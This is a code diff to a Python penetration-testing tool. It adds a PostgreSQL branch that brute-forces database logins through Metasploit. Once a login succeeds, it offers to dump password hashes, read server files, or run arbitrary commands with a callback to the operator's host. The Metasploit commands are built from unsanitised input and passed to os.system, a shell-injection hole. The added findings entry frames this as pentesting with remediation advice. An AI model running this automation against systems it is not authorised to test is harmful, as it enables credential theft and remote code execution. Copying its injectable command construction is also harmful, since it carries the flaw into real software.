@@ -28,6 +28,7 @@ def grep_string_in_file(string_to_find, file_path):
 def main():
     # Your default values
     output_file = "output.txt"
+    output_file_1 = "result.log"
 
     def handle_option():
         try:
@@ -385,7 +386,7 @@ def main():
                         print(
                             "No vulnerabilities found with minimum or low severity.")
 
-                elif "27017" in ports.split(',' or "27018" in ports.split(',')):
+                elif "27017" in ports.split(',') or "27018" in ports.split(','):
 
                     command = f"sudo nmap -sV -p 27018,27017 -sC -A -Pn --script= mongodb-info {ip} -oN result.txt"
                     try:
@@ -421,7 +422,7 @@ def main():
                             print("")
                             print("")
                             print(
-                                f"{RED}Vulnerability {RESET}Anonymous FTP login allowed = {GREEN}VALID {RESET}")
+                                f"{RED}Vulnerability {RESET}MongoDB Database Found Without Authentication = {GREEN}VALID {RESET}")
 
                             print("")
                             print(f"{LCYAN}Thanks For Using This Tool! {RESET}")
@@ -433,6 +434,64 @@ def main():
                     else:
                         print(
                             "No vulnerabilities found with minimum or low severity.")
+
+                elif "5432" in ports.split(',') or "5433" in ports.split(','):
+                    print("")
+                    print(
+                        f"{LCYAN}Bruteforce Username & Password PostgreSQL...\n{RESET}")
+                    metasploit_command = f"msfconsole -q -x 'use auxiliary/scanner/postgres/postgres_login; set RHOSTS {ip}; set RHOST {ip}; set RPORT {ports}; spool result.log; run; exit'"
+                    os.system(metasploit_command)
+
+                    try:
+                        with open(os.devnull, 'w') as nullfile:
+                            subprocess.check_call(command, shell=True,
+                                                  stdout=nullfile, stderr=nullfile)
+                    except subprocess.CalledProcessError:
+                        print("Error occurred.")
+                        print("")
+                    check_and_display_vulnerabilities("result.log")
+
+                    # Check if the specified string is found in the result.log file
+                    if grep_string_in_file("Login Successful", "result.log"):
+                        user = input(
+                            "\n===>> Insert User?  ")
+                        password = input(
+                            "===>> Insert Password?  ")
+                        selected_lhost = input(
+                            "===>> IP/URL Your Device/VPN (Default en0)?  ")
+                        print("\nWhat's Next?\n")
+                        print("1. Dumping User Hashes\n")
+                        print("2. View Files\n")
+                        print("3. Arbitrary Command Execution\n")
+                        postgresql_next = input(
+                            "===>> Choose Your Next Level?  ")
+
+                        # Check the user's choice and perform the corresponding action
+                        if postgresql_next == '1':
+                            # Perform action for dumping user hashes
+                            # Your code for dumping user hashes goes here
+                            print(f"{LCYAN}Dumping user hashes...\n{RESET}")
+                            metasploit_command = f"msfconsole -q -x 'use auxiliary/scanner/postgres/postgres_hashdump; set RHOSTS {ip}; set RHOST {ip}; set RPORT {ports}; set USERNAME {user}; set PASSWORD {password};spool result.log; run; exit'"
+                            os.system(metasploit_command)
+                        elif postgresql_next == '2':
+                            # Perform action for viewing files
+                            # Your code for viewing files goes here
+                            print(f"{LCYAN}Viewing files...\n{RESET}")
+                            metasploit_command = f"msfconsole -q -x 'use auxiliary/admin/postgres/postgres_readfile; set RHOSTS {ip}; set RHOST {ip}; set RPORT {ports}; set USERNAME {user}; set PASSWORD {password};spool result.log; run; exit'"
+                            os.system(metasploit_command)
+                        elif postgresql_next == '3':
+                            # Perform action for arbitrary command execution
+                            # Your code for arbitrary command execution goes here
+                            print(
+                                f"{LCYAN}Executing arbitrary commands...\n{RESET}")
+                            metasploit_command = f"msfconsole -q -x 'use multi/postgres/postgres_copy_from_program_cmd_exec; set RHOSTS {ip}; set RHOST {ip}; set RPORT {ports}; set USERNAME {user};set LHOST {selected_lhost}; set PASSWORD {password};spool result.log; run; exit'"
+                            os.system(metasploit_command)
+                        else:
+                            # Invalid choice
+                            print(
+                                "Invalid choice. Please choose a valid option (1, 2, or 3).")
+                    else:
+                        print("Users not found.")
 
                 # Another Step
                 retry_option = input(
@@ -616,6 +675,14 @@ def main():
             "High - Critical",
             "\nThe discovery of SSH username and password by a pentester poses a severe security risk as it allows unauthorized access to the system, potentially leading to data breaches, unauthorized modifications, or system compromise.",
             "\nImplement strong, unique passwords for SSH accounts and avoid using default or easily guessable credentials."
+        )
+
+        check_and_display_vulnerability(
+            "Weak Username and Password for PostgreSQL Database",
+            "Login Successful",
+            "High - Critical",
+            "\nSignificant as it poses a serious security risk to the confidentiality, integrity, and availability of the PostgreSQL database. An attacker could easily gain unauthorized access to sensitive data stored in the database, potentially leading to data breaches, unauthorized modifications, or data loss.",
+            "\nImplement Strong Password Policies: Enforce the use of complex, long, and unique passwords for all database accounts, including the default postgres account."
         )
 
         return vulnerabilities_found  # Return whether vulnerabilities were found
